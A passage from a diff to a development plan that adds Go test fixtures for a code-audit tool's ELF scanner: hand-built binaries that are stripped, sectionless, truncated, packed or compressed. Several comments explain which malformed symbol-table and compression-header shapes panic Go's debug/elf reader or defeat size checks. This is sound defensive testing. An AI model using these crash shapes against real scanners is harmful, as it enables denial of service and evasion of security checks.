+	"strings"
+)
+```
+
 - [ ] **Step 1: 写夹具构造器**
 
 创建 `internal/codeaudit/binary_fixtures_test.go`。**这是本计划风险最高的一段**，字段偏移必须逐字节正确（Go 的 `debug/elf` 用 `binary.Read` 按 `Section64` 字段顺序读 64 字节，无对齐填充）：
@@ -1481,6 +3075,8 @@ git commit -m "feat(audit): extract pickle call targets from binary streams"
 package codeaudit
 
 import (
+	"bytes"
+	"compress/zlib"
 	"encoding/binary"
 	"testing"
 
@@ -1500,11 +3096,71 @@ type elfSpec struct {
 	// verdict rather than a section summary.
 	text     []byte
 	textExec bool
+	// text2, when non-nil, adds a second section named .init, and text2Exec
+	// decides whether it carries SHF_EXECINSTR. Two executable sections are the
+	// case where the verdict has to be produced per section rather than once per
+	// file: .text may measure clean while .init is packed, and a fixture with one
+	// executable section cannot tell a loop over sections from a single check on
+	// the first match.
+	text2     []byte
+	text2Exec bool
+	// overrun, when non-zero, adds that many bytes to .text's declared sh_size
+	// without writing them. The section header then claims more than the file
+	// holds, which is the case the extractor has to catch by comparing the bytes
+	// it actually read against the declared size rather than by trusting the
+	// header.
+	overrun uint64
+	// noSections, when true, writes no section header table at all: e_shoff,
+	// e_shnum and e_shstrndx are all zero. debug/elf accepts this - it rejects
+	// only shoff == 0 with shnum != 0 - and yields zero sections, which is
+	// exactly the file the extractor's fail-open used to let through.
+	noSections bool
+	// soname, when non-empty, adds a DT_SONAME entry to .dynamic. It must be
+	// expressible because collectELF calls DynString(elf.DT_SONAME).
+	soname string
+	// interp, when non-empty, adds a PT_INTERP program header whose file range
+	// holds the NUL-terminated interpreter path. It must be expressible because
+	// collectELF walks ef.Progs looking for PT_INTERP.
+	interp string
+	// stripped, when true, omits the SHT_DYNSYM section header entirely. That is
+	// what makes debug/elf return elf.ErrNoSymbols: SectionByType(SHT_DYNSYM)
+	// returns nil only when no section carries that type. A .dynsym that exists
+	// but holds only the 24-byte null entry is a different case: it yields an
+	// empty symbol list and a nil error.
+	stripped bool
+	// zeroDynsym, when true, keeps the SHT_DYNSYM section header but writes its
+	// sh_size as 0: a symbol table that is present in the header table yet
+	// declares no bytes. It is the shape that makes debug/elf's 64-bit symbol
+	// reader panic, because getSymbols64 rejects only lengths that are not a
+	// multiple of 24 and then slices data[24:] - and zero is a multiple of 24.
+	// Neither of the other two shapes reaches that: a stripped file omits the
+	// section, and a normal empty table carries the 24-byte reserved entry. So
+	// the crash needs its own switch rather than a reuse of `stripped`.
+	zeroDynsym bool
+	// zdebugDynsym, when true, names the SHT_DYNSYM section ".zdebug_dynsym" and
+	// gives it a 12-byte ".zdebug" body: the "ZLIB" magic followed by a big-endian
+	// uncompressed size of 0. debug/elf reads that header when the section is
+	// opened, not when the file is parsed, and rewrites Section.Size from it - so
+	// the on-disk sh_size stays an ordinary nonzero value while the data the
+	// symbol reader receives is empty. That is the same empty buffer zeroDynsym
+	// produces, by a route no size check on the header can see. The section's
+	// sh_link still points at .dynstr, because the reader loads the string table
+	// before it slices the symbol data.
+	zdebugDynsym bool
+	// shortDynsym, when true, gives the SHT_DYNSYM section a body shorter than one
+	// 24-byte entry - eight bytes here - while leaving its name and sh_size
+	// ordinary. It is the boundary between the two shapes above and the well-formed
+	// table: the reader accepts the length, fails the multiple-of test and returns
+	// the format error, so collectELF must fail the scan closed. A guard written as
+	// a length range (len(data) < entrySize) would skip this table instead, which
+	// is a fail-open - the table is malformed, not empty - and this is the fixture
+	// that tells the two guards apart.
+	shortDynsym bool
 }
 
 // elfFixtureBytes builds a minimal but well-formed ELF64 little-endian shared
-// object with exactly the sections the extractor reads: .text, .dynstr, .dynsym,
-// .dynamic and .shstrtab.
+// object with exactly the sections the extractor reads: .text, .init, .dynstr,
+// .dynsym, .dynamic and .shstrtab, and (optionally) one PT_INTERP program header.
 //
 // It is built by hand rather than compiled, and committed as bytes rather than
 // as a binary. A `go build` fixture cannot carry a dynamic symbol table without
@@ -1516,22 +3172,56 @@ type elfSpec struct {
 // The layout follows the ELF64 spec, which debug/elf reads field by field:
 //
 //	ELF header            64 bytes
+//	program header table  only when interp != "": one 56-byte Elf64_Phdr at offset 64
+//	interpreter path      only when interp != "": NUL-terminated bytes
 //	.text                 spec.text
+//	.init                 spec.text2 (nothing written when nil)
 //	.dynstr               a leading NUL, then each name once, NUL-terminated
-//	.dynsym               24-byte entries; entry 0 is the null symbol
-//	.dynamic              16-byte entries; DT_NEEDED... then DT_NULL
+//	.dynsym               24-byte entries; entry 0 is the null symbol (a zeroed
+//	                      header slot when stripped)
+//	.dynamic              16-byte entries; DT_NEEDED..., [DT_SONAME], then DT_NULL
 //	.shstrtab             section names
-//	section headers       64 bytes each, 7 of them (index 0 is SHT_NULL)
+//	section headers       64 bytes each, 7 of them (index 0 is the required SHT_NULL)
+//
+// The section indices are fixed (see the sec* constants) rather than computed
+// from which sections a spec asks for, so e_shstrndx is the same number for
+// every fixture. A stripped file leaves its .dynsym slot as a zeroed SHT_NULL
+// header instead of shifting the ones after it: an unnamed zero-size section is
+// inert to both this extractor and debug/elf's SectionByType, and the fixed
+// index is what keeps e_shstrndx from having to be recomputed per fixture.
+//
+// Two layout hazards are worth stating because the failure mode is a crash
+// rather than a test failure, and they are the shapes this builder can produce
+// on purpose with zeroDynsym and zdebugDynsym. debug/elf slices off the first
+// symbol entry unconditionally after a length check that only rejects sizes not
+// a multiple of the entry size, so a SHT_DYNSYM that yields an empty buffer
+// panics with "slice bounds out of range [24:0]". That empty buffer is produced
+// by sh_size == 0, and also by a section named ".zdebug..." with a ZLIB header
+// whose declared size is 0, because opening the section rewrites its size. A
+// plain .dynsym must therefore always carry at least the 24-byte null entry.
+// shortDynsym sits on the other side of that same length check: a body that is
+// not a multiple of the entry size is rejected with a format error rather than
+// sliced, so holding it back would be a fail-open, not a fix.
 func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 	t.Helper()
 
 	const (
 		ehSize     = 64
+		phEntSize  = 56 // Elf64_Phdr: 2 uint32 + 6 uint64
 		shEntSize  = 64
 		symEntSize = 24
 		dynEntSize = 16
+		// Section indices. shNum counts the SHT_NULL entry at index 0.
+		secText    = 1
+		secInit    = 2
+		secDynstr  = 3
+		secDynsym  = 4
+		secDynamic = 5
+		secShstr   = 6
+		shNum      = 7
 	)
 	le := binary.LittleEndian
+	align8 := func(n int) int { return (n + 7) &^ 7 }
 
 	// .dynstr. Offsets are recorded as the table is built because both .dynsym
 	// and .dynamic index into it.
@@ -1547,37 +3237,75 @@ func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 		nameAt[s] = off
 		return off
 	}
-	importOffsets := make([]uint32, len(spec.imports))
-	for i, n := range spec.imports {
-		importOffsets[i] = intern(n)
+	var importOffsets []uint32
+	if !spec.stripped {
+		importOffsets = make([]uint32, len(spec.imports))
+		for i, n := range spec.imports {
+			importOffsets[i] = intern(n)
+		}
 	}
 	neededOffsets := make([]uint32, len(spec.needed))
 	for i, n := range spec.needed {
 		neededOffsets[i] = intern(n)
 	}
+	var sonameOff uint32
+	if spec.soname != "" {
+		sonameOff = intern(spec.soname)
+	}
 
 	// .dynsym. Entry zero is the reserved null symbol; getSymbols64 skips it, so
-	// the imports start at entry one.
-	dynsym := make([]byte, symEntSize*(len(spec.imports)+1))
-	for i, off := range importOffsets {
-		e := dynsym[symEntSize*(i+1):]
-		le.PutUint32(e[0:4], off)
-		e[4] = byte(elf.STB_GLOBAL)<<4 | byte(elf.STT_FUNC)
-		e[5] = 0
-		le.PutUint16(e[6:8], uint16(elf.SHN_UNDEF))
-		// st_value stays zero: an imported symbol has no address in this file,
-		// which is exactly why a symbol finding carries no byte offset.
-		le.PutUint64(e[8:16], 0)
-		le.PutUint64(e[16:24], 0)
+	// the imports start at entry one. A stripped file has no .dynsym at all, and
+	// the .zdebug shape carries the decompression header instead of symbols, while
+	// shortDynsym carries a body too short to hold even the null entry.
+	var dynsym []byte
+	if !spec.stripped {
+		switch {
+		case spec.zdebugDynsym:
+			// A .zdebug header: "ZLIB" and a big-endian uncompressed size. The size
+			// here is 0, which is what open-time parsing turns into an empty read.
+			dynsym = make([]byte, symEntSize*2)
+			copy(dynsym[0:4], "ZLIB")
+		case spec.shortDynsym:
+			// A body under one entry wide. It is written verbatim with sh_size == 8,
+			// so every header the file parser sees is ordinary; only the length the
+			// symbol reader tests rejects it.
+			dynsym = make([]byte, 8)
+		default:
+			dynsym = make([]byte, symEntSize*(len(spec.imports)+1))
+			for i, off := range importOffsets {
+				e := dynsym[symEntSize*(i+1):]
+				le.PutUint32(e[0:4], off)
+				e[4] = byte(elf.STB_GLOBAL)<<4 | byte(elf.STT_FUNC)
+				e[5] = 0
+				le.PutUint16(e[6:8], uint16(elf.SHN_UNDEF))
+				// st_value stays zero: an imported symbol has no address in this file,
+				// which is exactly why a symbol finding carries no byte offset.
+				le.PutUint64(e[8:16], 0)
+				le.PutUint64(e[16:24], 0)
+			}
+		}
 	}
 
-	// .dynamic: one DT_NEEDED per library, then the DT_NULL terminator.
-	dynamic := make([]byte, dynEntSize*(len(spec.needed)+1))
-	for i, off := range neededOffsets {
-		e := dynamic[dynEntSize*i:]
+	// .dynamic: one DT_NEEDED per library, an optional DT_SONAME, then DT_NULL.
+	nDyn := len(spec.needed)
+	if spec.soname != "" {
+		nDyn++
+	}
+	dynamic := make([]byte, dynEntSize*(nDyn+1))
+	di := 0
+	for _, off := range neededOffsets {
+		e := dynamic[dynEntSize*di:]
 		le.PutUint64(e[0:8], uint64(elf.DT_NEEDED))
 		le.PutUint64(e[8:16], uint64(off))
+		di++
 	}
+	if spec.soname != "" {
+		e := dynamic[dynEntSize*di:]
+		le.PutUint64(e[0:8], uint64(elf.DT_SONAME))
+		le.PutUint64(e[8:16], uint64(sonameOff))
+		di++
+	}
+	// The DT_NULL terminator is the zeroed final entry written by make above.
 
 	// .shstrtab: the section names, indexed by offset.
 	shstrtab := []byte{0}
@@ -1588,15 +3316,30 @@ func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 		return off
 	}
 	nText := shName(".text")
+	nInit := shName(".init")
 	nDynstr := shName(".dynstr")
-	nDynsym := shName(".dynsym")
+	dynsymName := ".dynsym"
+	if spec.zdebugDynsym {
+		dynsymName = ".zdebug_dynsym"
+	}
+	nDynsym := shName(dynsymName)
 	nDynamic := shName(".dynamic")
 	nShstrtab := shName(".shstrtab")
 
-	align8 := func(n int) int { return (n + 7) &^ 7 }
+	// Lay out the file. Sections start at 64 unless a program header table and
+	// interpreter path precede them.
 	off := ehSize
+	phoff, interpOff := 0, 0
+	if spec.interp != "" {
+		phoff = off
+		off = align8(off + phEntSize)
+		interpOff = off
+		off = align8(off + len(spec.interp) + 1) // + trailing NUL
+	}
 	textOff := off
 	off = align8(off + len(spec.text))
+	initOff := off
+	off = align8(off + len(spec.text2))
 	dynstrOff := off
 	off = align8(off + len(dynstr))
 	dynsymOff := off
@@ -1607,7 +3350,16 @@ func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 	off = align8(off + len(shstrtab))
 	shoff := off
 
-	buf := make([]byte, shoff+shEntSize*7)
+	// A file with no section header table is one where e_shoff and e_shnum are
+	// both zero; debug/elf accepts that pair and reports no sections.
+	if spec.noSections {
+		shoff = 0
+	}
+	bufLen := off
+	if shoff != 0 {
+		bufLen = shoff + shEntSize*shNum
+	}
+	buf := make([]byte, bufLen)
 
 	// ELF header.
 	copy(buf[0:4], []byte{0x7f, 'E', 'L', 'F'})
@@ -1618,13 +3370,36 @@ func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 	le.PutUint16(buf[16:18], uint16(elf.ET_DYN))
 	le.PutUint16(buf[18:20], uint16(elf.EM_X86_64))
 	le.PutUint32(buf[20:24], uint32(elf.EV_CURRENT))
-	le.PutUint64(buf[40:48], uint64(shoff))
+	le.PutUint64(buf[32:40], uint64(phoff)) // e_phoff
+	le.PutUint64(buf[40:48], uint64(shoff)) // e_shoff
 	le.PutUint16(buf[52:54], ehSize)
-	le.PutUint16(buf[54:56], 56) // e_phentsize, unused with e_phnum == 0
-	le.PutUint16(buf[56:58], 0)  // e_phnum: no program headers
+	le.PutUint16(buf[54:56], phEntSize)
+	phnum := 0
+	if spec.interp != "" {
+		phnum = 1
+	}
+	le.PutUint16(buf[56:58], uint16(phnum)) // e_phnum
 	le.PutUint16(buf[58:60], shEntSize)
-	le.PutUint16(buf[60:62], 7) // e_shnum
-	le.PutUint16(buf[62:64], 5) // e_shstrndx: .shstrtab is section 5
+	if shoff != 0 {
+		le.PutUint16(buf[60:62], shNum)    // e_shnum
+		le.PutUint16(buf[62:64], secShstr) // e_shstrndx: .shstrtab is section 6
+	}
+
+	// Program header table, when requested. Only PT_INTERP is needed; a PT_PHDR
+	// entry and a .interp section are conventional, not required - collectELF
+	// only walks f.Progs for PT_INTERP and opens its file range.
+	if spec.interp != "" {
+		b := buf[phoff:]
+		le.PutUint32(b[0:4], uint32(elf.PT_INTERP))
+		le.PutUint32(b[4:8], uint32(elf.PF_R))             // p_flags: read (conventional)
+		le.PutUint64(b[8:16], uint64(interpOff))           // p_offset
+		le.PutUint64(b[16:24], 0)                          // p_vaddr
+		le.PutUint64(b[24:32], 0)                          // p_paddr
+		le.PutUint64(b[32:40], uint64(len(spec.interp)+1)) // p_filesz
+		le.PutUint64(b[40:48], uint64(len(spec.interp)+1)) // p_memsz
+		le.PutUint64(b[48:56], 1)                          // p_align
+		copy(buf[interpOff:], spec.interp)                 // trailing NUL from make
+	}
 
 	// Section headers, written field by field in Section64's order.
 	sh := func(i int, name uint32, typ elf.SectionType, flags uint64, offset, size uint64, link, info uint32, addralign, entsize uint64) {
@@ -1641,17 +3416,40 @@ func elfFixtureBytes(t *testing.T, spec elfSpec) []byte {
 		le.PutUint64(b[56:64], entsize)
 	}
 
-	textFlags := uint64(elf.SHF_ALLOC)
-	if spec.textExec {
-		textFlags |= uint64(elf.SHF_EXECINSTR)
+	if shoff != 0 {
+		textFlags := uint64(elf.SHF_ALLOC)
+		if spec.textExec {
+			textFlags |= uint64(elf.SHF_EXECINSTR)
+		}
+		// sh_size is the declared size. spec.overrun adds bytes that were never
+		// written, so the section claims more than the file holds - which the
+		// extractor must notice by comparing what it read against this number
+		// rather than by trusting it.
+		sh(secText, nText, elf.SHT_PROGBITS, textFlags, uint64(textOff), uint64(len(spec.text))+spec.overrun, 0, 0, 8, 0)
+		if spec.text2 != nil {
+			initFlags := uint64(elf.SHF_ALLOC)
+			if spec.text2Exec {
+				initFlags |= uint64(elf.SHF_EXECINSTR)
+			}
+			sh(secInit, nInit, elf.SHT_PROGBITS, initFlags, uint64(initOff), uint64(len(spec.text2)), 0, 0, 8, 0)
+		}
+		sh(secDynstr, nDynstr, elf.SHT_STRTAB, uint64(elf.SHF_ALLOC), uint64(dynstrOff), uint64(len(dynstr)), 0, 0, 1, 0)
+		if !spec.stripped {
+			// sh_size is the declared size. zeroDynsym writes 0 over it, keeping
+			// the section present but claiming no bytes - the shape that panics
+			// debug/elf's 64-bit symbol reader.
+			dynsymSize := uint64(len(dynsym))
+			if spec.zeroDynsym {
+				dynsymSize = 0
+			}
+			sh(secDynsym, nDynsym, elf.SHT_DYNSYM, uint64(elf.SHF_ALLOC), uint64(dynsymOff), dynsymSize, secDynstr, 1, 8, symEntSize)
+		}
+		sh(secDynamic, nDynamic, elf.SHT_DYNAMIC, uint64(elf.SHF_ALLOC), uint64(dynamicOff), uint64(len(dynamic)), secDynstr, 0, 8, dynEntSize)
+		sh(secShstr, nShstrtab, elf.SHT_STRTAB, 0, uint64(shstrtabOff), uint64(len(shstrtab)), 0, 0, 1, 0)
 	}
-	sh(1, nText, elf.SHT_PROGBITS, textFlags, uint64(textOff), uint64(len(spec.text)), 0, 0, 8, 0)
-	sh(2, nDynstr, elf.SHT_STRTAB, uint64(elf.SHF_ALLOC), uint64(dynstrOff), uint64(len(dynstr)), 0, 0, 1, 0)
-	sh(3, nDynsym, elf.SHT_DYNSYM, uint64(elf.SHF_ALLOC), uint64(dynsymOff), uint64(len(dynsym)), 2, 1, 8, symEntSize)
-	sh(4, nDynamic, elf.SHT_DYNAMIC, uint64(elf.SHF_ALLOC), uint64(dynamicOff), uint64(len(dynamic)), 2, 0, 8, dynEntSize)
-	sh(5, nShstrtab, elf.SHT_STRTAB, 0, uint64(shstrtabOff), uint64(len(shstrtab)), 0, 0, 1, 0)
 
 	copy(buf[textOff:], spec.text)
+	copy(buf[initOff:], spec.text2)
 	copy(buf[dynstrOff:], dynstr)
 	copy(buf[dynsymOff:], dynsym)
 	copy(buf[dynamicOff:], dynamic)
@@ -1669,6 +3467,96 @@ func uniformBytes(n int) []byte {
 		b[i] = byte(i * 7)
 	}
 	return b
+}
+
+// elfCompressedFixture builds a minimal ELF64 with one section, .text, carrying
+// SHF_EXECINSTR | SHF_COMPRESSED. Its compression header (an Elf64_Chdr) declares
+// chSize as the uncompressed size, and its body is a real zlib stream of payload,
+// so opening the section succeeds and yields len(payload) bytes.
+//
+// It exists because chSize is attacker-controlled and debug/elf does not range-
+// check it: for a compressed section it copies ch_size straight into
+// Section.Size, applying an int64 range check only to sh_size. A value at or
+// above 2^63 therefore makes int64(Section.Size) negative, while the readable
+// size stays small - the exact pair a short-read check has to compare, and the
+// pair a signed comparison mis-handles.
+func elfCompressedFixture(t *testing.T, chSize uint64, payload []byte) []byte {
+	t.Helper()
+
+	const (
+		ehSize    = 64
+		shEntSize = 64
+		chdrSize  = 24 // Elf64_Chdr: uint32 + uint32 + uint64 + uint64
+	)
+	le := binary.LittleEndian
+	align8 := func(n int) int { return (n + 7) &^ 7 }
+
+	var z bytes.Buffer
+	zw := zlib.NewWriter(&z)
+	if _, err := zw.Write(payload); err != nil {
+		t.Fatalf("zlib write: %v", err)
+	}
+	if err := zw.Close(); err != nil {
+		t.Fatalf("zlib close: %v", err)
+	}
+
+	// The section body is the compression header followed by the compressed
+	// stream. debug/elf reads the header at load time and decompresses from
+	// compressionOffset (the header's own size) onward.
+	body := make([]byte, chdrSize+z.Len())
+	le.PutUint32(body[0:4], uint32(elf.COMPRESS_ZLIB)) // ch_type
+	le.PutUint32(body[4:8], 0)                         // ch_reserved
+	le.PutUint64(body[8:16], chSize)                   // ch_size (uncompressed)
+	le.PutUint64(body[16:24], 1)                       // ch_addralign
+	copy(body[chdrSize:], z.Bytes())
+
+	shstrtab := []byte{0}
+	nameText := uint32(len(shstrtab))
+	shstrtab = append(shstrtab, ".text"...)
+	shstrtab = append(shstrtab, 0)
+	nameShstr := uint32(len(shstrtab))
+	shstrtab = append(shstrtab, ".shstrtab"...)
+	shstrtab = append(shstrtab, 0)
+
+	bodyOff := ehSize
+	shstrOff := align8(bodyOff + len(body))
+	shoff := align8(shstrOff + len(shstrtab))
+	buf := make([]byte, shoff+shEntSize*3)
+
+	// ELF header: class 64, little-endian, ET_DYN, no program headers.
+	copy(buf[0:4], []byte{0x7f, 'E', 'L', 'F'})
+	buf[4] = byte(elf.ELFCLASS64)
+	buf[5] = byte(elf.ELFDATA2LSB)
+	buf[6] = byte(elf.EV_CURRENT)
+	buf[7] = byte(elf.ELFOSABI_NONE)
+	le.PutUint16(buf[16:18], uint16(elf.ET_DYN))
+	le.PutUint16(buf[18:20], uint16(elf.EM_X86_64))
+	le.PutUint32(buf[20:24], uint32(elf.EV_CURRENT))
+	le.PutUint64(buf[40:48], uint64(shoff)) // e_shoff
+	le.PutUint16(buf[52:54], ehSize)
+	le.PutUint16(buf[58:60], shEntSize)
+	le.PutUint16(buf[60:62], 3) // e_shnum: null, .text, .shstrtab
+	le.PutUint16(buf[62:64], 2) // e_shstrndx
+
+	copy(buf[bodyOff:], body)
+	copy(buf[shstrOff:], shstrtab)
+
+	sh := func(i int, name uint32, typ elf.SectionType, flags uint64, offset, size, addralign uint64) {
+		b := buf[shoff+i*shEntSize:]
+		le.PutUint32(b[0:4], name)
+		le.PutUint32(b[4:8], uint32(typ))
+		le.PutUint64(b[8:16], flags)
+		le.PutUint64(b[24:32], offset)
+		le.PutUint64(b[32:40], size)
+		le.PutUint64(b[48:56], addralign)
+	}
+	// .text is executable and compressed; debug/elf takes the section's size from
+	// the compression header, so ch_size is what a reader reports as its size.
+	// Only the two flags it needs are set - a compressed section that is also
+	// SHF_ALLOC is rejected by the reader.
+	sh(1, nameText, elf.SHT_PROGBITS, uint64(elf.SHF_EXECINSTR)|uint64(elf.SHF_COMPRESSED), uint64(bodyOff), uint64(len(body)), 1)
+	sh(2, nameShstr, elf.SHT_STRTAB, 0, uint64(shstrOff), uint64(len(shstrtab)), 1)
+	return buf
 }
 ```
 
@@ -1726,6 +3614,8 @@ func TestCollectELFEvidence(t *testing.T) {
 		needed:   []string{"libcurl.so.4", "libc.so.6"},
 		text:     uniformBytes(512),
 		textExec: true,
+		soname:   "libevil.so.1",
+		interp:   "/lib64/ld-linux-x86-64.so.2",
 	})
 	path := writeTestBytes(t, dir, "libevil.so", raw)
 
@@ -1748,6 +3638,17 @@ func TestCollectELFEvidence(t *testing.T) {
 		if !containsString(bySource[SourceNeeded], want) {
 			t.Errorf("needed evidence missing %q; got %v", want, bySource[SourceNeeded])
 		}
+	}
+	// The soname and the interpreter are the two facts this parse reads from
+	// structure rather than from symbols: collectELF writes the soname as a
+	// section line and the interpreter as a notice. Both are asserted in the
+	// exact shape it writes, so a format change breaks this test rather than
+	// silently passing an assertion written against the old shape.
+	if !containsString(bySource[SourceSection], "soname libevil.so.1") {
+		t.Errorf("soname section line missing; got %v", bySource[SourceSection])
+	}
+	if !containsString(bySource[SourceNotice], "interpreter /lib64/ld-linux-x86-64.so.2") {
+		t.Errorf("interpreter notice missing; got %v", bySource[SourceNotice])
 	}
 	var sawExecutableSection, sawHighEntropySection bool
 	for _, text := range bySource[SourceSection] {
@@ -1788,12 +3689,21 @@ func TestCollectELFEvidenceSkipsEntropyForDataSections(t *testing.T) {
 }
 
 // TestCollectELFEvidenceOnAStrippedFile pins that a file with no dynamic symbol
-// table is a completed look, not a failure: static binaries have no .dynsym, and
-// treating that as an error would make every Go binary build in a model package
-// an incomplete scan.
+// table at all is a completed look, not a failure, and that the look says so.
+// The fixture omits the SHT_DYNSYM section entirely, which is what makes
+// debug/elf return elf.ErrNoSymbols: treating that as an error would make every
+// Go binary build in a model package an incomplete scan. The notice it produces
+// is what tells a reader the symbol list is empty because there is no table.
+//
+// The notice names the section type that is absent rather than calling the file
+// "stripped or static". A static binary has no .dynsym but does carry .symtab,
+// so the old wording was false for it, and a file with no section header table
+// at all is not "stripped" either - it is a different condition with its own
+// structural bound. A notice is a statement about the bytes, so it says which
+// table was looked for and not found.
 func TestCollectELFEvidenceOnAStrippedFile(t *testing.T) {
 	dir := t.TempDir()
-	raw := elfFixtureBytes(t, elfSpec{text: []byte("no symbols here")})
+	raw := elfFixtureBytes(t, elfSpec{text: []byte("no symbols here"), stripped: true})
 	path := writeTestBytes(t, dir, "stripped", raw)
 
 	set := newTestEvidence(path, KindELF)
@@ -1802,6 +3712,473 @@ func TestCollectELFEvidenceOnAStrippedFile(t *testing.T) {
 	}
 	if set.Err != nil {
 		t.Errorf("Err = %v, want nil", set.Err)
+	}
+	if set.Bound.Structural {
+		t.Errorf("a stripped file was marked structural (%q); stripping is ordinary and must not withhold a pass", set.Bound.Reason)
+	}
+
+	var notices []string
+	for _, l := range set.Lines {
+		if l.Source == SourceNotice {
+			notices = append(notices, l.Text)
+		}
+	}
+	if !containsString(notices, "no dynamic symbol table (SHT_DYNSYM absent)") {
+		t.Errorf("no absent-.dynsym notice; got notices %v", notices)
+	}
+	for _, n := range notices {
+		if strings.Contains(n, "stripped or static") {
+			t.Errorf("the notice still claims the file is stripped or static: %q", n)
+		}
+	}
+}
+
+// TestCollectELFEvidenceOnAFileWithNoSectionHeaders pins the removal of a
+// fail-open. The entropy pass walks the executable sections, so a file with no
+// section header table used to walk nothing, emit no line and no bound, and pass
+// as clean - a pass that claimed to have looked for packing in a file it never
+// examined. The fixture writes e_shoff, e_shnum and e_shstrndx as zero, which is
+// the shape of a file whose section table was removed, and that must come back
+// as a structural gap that names the section header table rather than as a clean
+// pass.
+func TestCollectELFEvidenceOnAFileWithNoSectionHeaders(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{text: uniformBytes(512), textExec: true, noSections: true})
+	path := writeTestBytes(t, dir, "packed", raw)
+
+	// The fixture itself must survive the standard library before the extractor
+	// is asked about it: a file debug/elf refuses is a different case from one
+	// it reads and finds no sections in.
+	f, err := elf.Open(path)
+	if err != nil {
+		t.Fatalf("elf.Open on the sectionless fixture: %v", err)
+	}
+	if got := len(f.Sections); got != 0 {
+		t.Fatalf("fixture sections = %d, want 0", got)
+	}
+	f.Close()
+
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("a file with no section header table produced no structural bound; bound = %+v", set.Bound)
+	}
+	// The reason must name the real condition. It is not a missing symbol table:
+	// a stripped file has no .dynsym either and is not bounded, and this file's
+	// own case is the absent section header table.
+	if !strings.Contains(set.Bound.Reason, "section header table") {
+		t.Errorf("bound reason = %q, want it to name the section header table", set.Bound.Reason)
+	}
+	if strings.Contains(set.Bound.Reason, "symbol") {
+		t.Errorf("bound reason = %q, want it not to claim a symbol table is the problem", set.Bound.Reason)
+	}
+}
+
+// TestCollectELFEvidenceReportsASectionThatOverrunsTheFile pins that a section
+// header is not taken at its word. The fixture adds bytes to .text's declared
+// sh_size that were never written, so the read stops at end of file and returns
+// fewer bytes than the header claims. An extractor that trusted the header and
+// measured whatever it got would score a prefix and call it the section; an
+// extractor that noticed but said nothing would leave the reader unable to tell
+// a short section from a short read. So the shortfall is structural and the
+// declared size is still reported as what the header said.
+func TestCollectELFEvidenceReportsASectionThatOverrunsTheFile(t *testing.T) {
+	dir := t.TempDir()
+	const textLen, overrun = 512, 1 << 20
+	raw := elfFixtureBytes(t, elfSpec{text: uniformBytes(textLen), textExec: true, overrun: overrun})
+	path := writeTestBytes(t, dir, "truncated.so", raw)
+
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF: %v", err)
+	}
+	if !set.Bound.Structural {
+		t.Fatalf("a section declaring more than the file holds produced no structural bound; bound = %+v", set.Bound)
+	}
+	if !strings.Contains(set.Bound.Reason, "declares") || !strings.Contains(set.Bound.Reason, "readable") {
+		t.Errorf("bound reason = %q, want it to state declared and readable byte counts", set.Bound.Reason)
+	}
+
+	// size= must still be the declared size, so a reader can pair the section
+	// line with the shortfall instead of seeing a number that silently matched
+	// the read. The section line carries its executability flag after size=, so
+	// the declared size is asserted as the line's prefix and not as the whole
+	// line.
+	wantDeclared := fmt.Sprintf(".text size=%d", textLen+overrun)
+	var sawDeclared bool
+	for _, l := range set.Lines {
+		if l.Source == SourceSection && strings.HasPrefix(l.Text, ".text size=") {
+			sawDeclared = strings.HasPrefix(l.Text, wantDeclared+" ")
+		}
+	}
+	if !sawDeclared {
+		t.Errorf("no section line %q; lines = %v", wantDeclared, set.Lines)
+	}
+
+	// The short read must not have been scored: an entropy line would be a number
+	// over a prefix, presented with the same authority as one over a whole section.
+	for _, l := range set.Lines {
+		if l.Source == SourceEntropy {
+			t.Errorf("a section that overran the file still produced entropy evidence %q", l.Text)
+		}
+	}
+}
+
+// TestCollectELFEvidenceMeasuresEveryExecutableSection pins that the entropy
+// pass is per section rather than per file. The fixture carries two executable
+// sections, a packed .text and a flat .init, and the file-level boolean a
+// one-section fixture cannot distinguish from a loop would report either both or
+// neither. Exactly one line may appear, and it must name .text.
+func TestCollectELFEvidenceMeasuresEveryExecutableSection(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{
+		text:      uniformBytes(512),
+		textExec:  true,
+		text2:     bytes.Repeat([]byte{0x90}, 512), // NOP sled: executable and not random
+		text2Exec: true,
+	})
+	path := writeTestBytes(t, dir, "twoexec.so", raw)
+
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF: %v", err)
+	}
+	if set.Bound.Structural {
+		t.Fatalf("a well-formed two-section file was marked structural: %q", set.Bound.Reason)
+	}
+
+	var entropyLines []string
+	for _, l := range set.Lines {
+		if l.Source == SourceEntropy {
+			entropyLines = append(entropyLines, l.Text)
+		}
+	}
+	if len(entropyLines) != 1 || !strings.HasPrefix(entropyLines[0], "high-entropy-executable-section .text ") {
+		t.Errorf("entropy lines = %v, want exactly one for .text", entropyLines)
+	}
+}
+
+// TestCollectELFEmptyDynsymIsNotAStrippedFile pins the distinction the stripped
+// test cannot see: a .dynsym that exists but holds only the reserved null entry
+// yields an empty symbol list and a nil error, not ErrNoSymbols. "This binary
+// imports nothing" and "this file has no symbol table" are different facts, and
+// reporting the second when the first is true would be a false statement in the
+// report - so no notice may appear here.
+func TestCollectELFEmptyDynsymIsNotAStrippedFile(t *testing.T) {
+	dir := t.TempDir()
+	raw := elfFixtureBytes(t, elfSpec{text: []byte("a library with no imports")})
+	path := writeTestBytes(t, dir, "libempty.so", raw)
+
+	set := newTestEvidence(path, KindELF)
+	if err := collectELF(path, set, DefaultBinaryConfig()); err != nil {
+		t.Fatalf("collectELF: %v", err)
+	}
+	for _, l := range set.Lines {
+		if l.Source == SourceNotice && strings.Contains(l.Text, "no dynamic symbol table") {
+			t.Errorf("a present but empty .dynsym produced the stripped/static notice: %q", l.Text)
+		}
+	}
+}
+
+// TestCollectELFEvidenceOnAZeroSizeDynsym pins the crash guard. A SHT_DYNSYM that
